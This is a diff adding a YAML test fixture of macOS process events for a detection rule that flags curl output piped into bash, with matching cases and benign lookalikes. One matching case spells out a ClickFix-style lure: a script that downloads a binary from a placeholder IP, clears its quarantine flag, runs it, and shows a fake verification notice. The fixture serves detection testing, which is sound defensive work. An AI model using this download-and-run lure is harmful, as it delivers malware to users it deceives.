@@ -1,0 +1,34 @@
+match:
+  - desc: 'curl -sS https://.../echo-art-fish.sh | bash - siblings under the same sh (ART T1059.004 #2)'
+    events:
+      - name: CreateProcess
+        proc: {pid: 5301, ppid: 5300, exe: /usr/bin/curl, name: curl, cmdline: "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", args: [curl, -sS, "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh"], uid: 501, euid: 501, signing_id: com.apple.curl, is_platform: true, is_signed: true}
+      - name: CreateProcess
+        proc: {pid: 5302, ppid: 5300, exe: /bin/bash, name: bash, cmdline: "bash", args: [bash], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
+  - desc: ClickFix lure typed in Terminal - /bin/bash -c "$(curl -fsSL http://.../install.sh)"
+    events:
+      - name: CreateProcess
+        proc: {pid: 5303, ppid: 5310, exe: /usr/bin/curl, name: curl, cmdline: "curl -fsSL http://198.51.100.23/install.sh", args: [curl, -fsSL, "http://198.51.100.23/install.sh"], uid: 501, euid: 501, signing_id: com.apple.curl, is_platform: true, is_signed: true}
+      - name: CreateProcess
+        proc: {pid: 5304, ppid: 5310, exe: /bin/bash, name: bash, cmdline: "/bin/bash -c #!/bin/bash\nset -e\nU=$(whoami)\nD=/Users/$U/.local/.c\nmkdir -p $D\ncurl -fsSL http://198.51.100.23/update -o $D/update\nchmod +x $D/update\nxattr -c $D/update\n$D/update &\necho 'Done. Your Mac has been verified.'\nosascript -e 'display notification \"Verification complete\"'\nexit 0\n# padding to emulate a long inline payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", args: [/bin/bash, -c, "#!/bin/bash\nset -e\nU=$(whoami)\nD=/Users/$U/.local/.c\nmkdir -p $D\ncurl -fsSL http://198.51.100.23/update -o $D/update\nchmod +x $D/update\nxattr -c $D/update\n$D/update &\necho 'Done. Your Mac has been verified.'\nosascript -e 'display notification \"Verification complete\"'\nexit 0\n# padding to emulate a long inline payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
+nomatch:
+  - desc: benign lookalike - official Homebrew installer (exact command line excluded)
+    events:
+      - name: CreateProcess
+        proc: {pid: 5311, ppid: 5320, exe: /usr/bin/curl, name: curl, cmdline: "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh", args: [curl, -fsSL, "https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"], uid: 501, euid: 501, signing_id: com.apple.curl, is_platform: true, is_signed: true}
+      - name: CreateProcess
+        proc: {pid: 5312, ppid: 5320, exe: /bin/bash, name: bash, cmdline: "/bin/bash -c #!/bin/bash\n# installer (synthetic stand-in for the real Homebrew install.sh)\nset -u\nfail() {\n  printf \"%s\\n\" \"$@\" >&2\n  exit 1\n}\nif [ -z \"${BASH_VERSION:-}\" ]; then fail \"bash required\"; fi\nPREFIX=/opt/homebrew\nREPO=https://github.com/Homebrew/brew\necho \"==> This script will install: ${PREFIX}/bin/brew\"\necho \"==> Checking for sudo access (which may request your password)...\"\n# padding: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", args: [/bin/bash, -c, "#!/bin/bash\n# installer (synthetic stand-in for the real Homebrew install.sh)\nset -u\nfail() {\n  printf \"%s\\n\" \"$@\" >&2\n  exit 1\n}\nif [ -z \"${BASH_VERSION:-}\" ]; then fail \"bash required\"; fi\nPREFIX=/opt/homebrew\nREPO=https://github.com/Homebrew/brew\necho \"==> This script will install: ${PREFIX}/bin/brew\"\necho \"==> Checking for sudo access (which may request your password)...\"\n# padding: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
+  - desc: benign lookalike - curl saves a file, then the script is run by path
+    events:
+      - name: CreateProcess
+        proc: {pid: 5313, ppid: 5330, exe: /usr/bin/curl, name: curl, cmdline: "curl -fsSLo install.sh https://example.com/install.sh", args: [curl, -fsSLo, install.sh, "https://example.com/install.sh"], uid: 501, euid: 501, signing_id: com.apple.curl, is_platform: true, is_signed: true}
+      - name: CreateProcess
+        proc: {pid: 5314, ppid: 5330, exe: /bin/bash, name: bash, cmdline: "bash install.sh", args: [bash, install.sh], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
+  - desc: curl, then an interactive bash in the same shell five minutes later
+    events:
+      - name: CreateProcess
+        time: 2026-01-01T00:00:00Z
+        proc: {pid: 5315, ppid: 5340, exe: /usr/bin/curl, name: curl, cmdline: "curl -s https://example.com/status", args: [curl, -s, "https://example.com/status"], uid: 501, euid: 501, signing_id: com.apple.curl, is_platform: true, is_signed: true}
+      - name: CreateProcess
+        time: 2026-01-01T00:05:00Z
+        proc: {pid: 5316, ppid: 5340, exe: /bin/bash, name: bash, cmdline: "bash", args: [bash], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
